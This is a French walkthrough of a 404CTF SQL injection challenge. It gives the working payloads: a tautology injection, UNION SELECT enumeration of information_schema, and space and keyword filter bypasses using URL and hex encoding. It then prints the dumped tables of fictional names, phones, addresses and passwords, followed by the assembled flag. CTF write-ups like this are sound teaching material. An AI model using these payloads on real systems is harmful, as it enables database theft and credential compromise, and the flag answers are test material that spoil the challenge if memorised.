Un site qui nous demande SUBTILEMENT de tenter des SQLi.

3 sections, la première s'intitule OR 

On tente donc la plus basique injection

`' OR 1=1; --`

Bingo, on obtient une table avec des infos. Cool !

```
1	RIRI	0145489625	5 avenue des groseilles	OpérationEpervier
2	FIFI	0145889625	1 rue des myrtilles	OpérationFaucon
3	LOULOU	0115789625	1 rue des pommes	OpérationFaucon
456	JAJA	0145769625	1 rue des pommes	OpérationGorfou
472	RORO	0189999625	5 boulevard des poires	OpérationFaucon
7456	TITI	404CTF{0145769456}	404CTF{21 rue des kiwis}	OpérationGorfou
7865	DEDE	0145781225	3 avenue des oranges	OpérationMouette
16579	DIDI	0145789625	1 rue des pommes	OpérationEpervier
```

On cherche Titi, ça tombe bien. On a le téléphone et l'adresse.

Au tour de la seconde page. Ce coup ci, on nous indique qu'il faudra utiliser Union
La même injection nous montre tous les résultats, mais aucun flag ici.
Commencons à énumerer la base
`' OR 1=1 UNION SELECT NULL, version() -- `
Nous donne 8.0.29
Cool, ça marche. Enumerons les tables

`user = page2@10.2.3.111`
`dbname = UnionVendeurs`
1 seule autre db : `information_schema`

Enumerer colonnes : `' OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns -- `

```
cooperatives	pseudo
cooperatives	cooperative
Users	id
Users	nom
Users	prenom
```

On avait déjà la première table, on affiche donc la seconde avec 
`' OR 1=1 UNION SELECT nom, prenom FROM Users --  `

```
Assin	Marc
Outan	Laurent
Gator	Ali
Reptile	Eric
Culé	Roland
404CTF{Vereux}	404CTF{UnGorfou}
Abbé	Oscar
Conda	Anna
```

On a maintenant Nom, Prenom, Telephone et Adresse.
Il nous manque Date, Heure et Mdp
Rdv sur la 3ème page qui nous parle de filtres. On va faire chauffer le FILTER BY
On n'a plus le droit aux espaces. Ah.
On les remplace par des %20
`'%20OR%201=1%20--%20`
donne
```
OpérationEpervier	2021-11-02	19h
OpérationMouette	2021-09-14	19h
OpérationFaucon	2022-01-01	20h
OpérationGorfou	404CTF{2022-07-14}	404CTF{01hDuMatin}
```
Il ne nous manque plus que le mot de passe
`'%20OR%201=1%20UNION%20SELECT%20table_schema,%20table_name,%20column_name%20FROM%20information_schema.columns%20--%20`
Apparemment, SELECT est bloqué aussi.
`1'%20OR%201=1%20UNION%20SELE%0bCT%20table_schema,%20table_name,%20column_name%20FROM%20information_schema.columns%20--%20`

`1'%20OR%201=1%20UNION%20%53%45%4c%45%43%54%20table_schema,%20table_name,%20column_name%20FROM%20information_schema.columns%20--%20` marche

```
RencontreVendeurs	Rdv	code
RencontreVendeurs	Rdv	dateRdv
RencontreVendeurs	Rdv	heureRdv
RencontreVendeurs	Password	id
RencontreVendeurs	Password	mdp
```

On cherche à afficher la table Password à présent :
`1'%20OR%201=1%20UNION%20%53%45%4c%45%43%54%20NULL,%20id,%20mdp%20FROM%20Password%20--%20`
```
1	d7uA9kYU3
	2	5qKrD4F7p
	3	SXq3rZ35v
	456	FGp4Q93tk
	472	qJB5y45Xe
	7456	404CTF{GorfousAuPouvoir}
	7865	S5eN2p5Wj
	16579	T3h98HdFy
```
On a tout ce qu'il nous faut pour récupérer le flag à présent

404CTF{NomPrénomTéléphoneAdresseDateHeureMdp}
->
404CTF{VereuxUnGorfou014576945621ruedeskiwis2022-07-1401hDuMatinGorfousAuPouvoir}
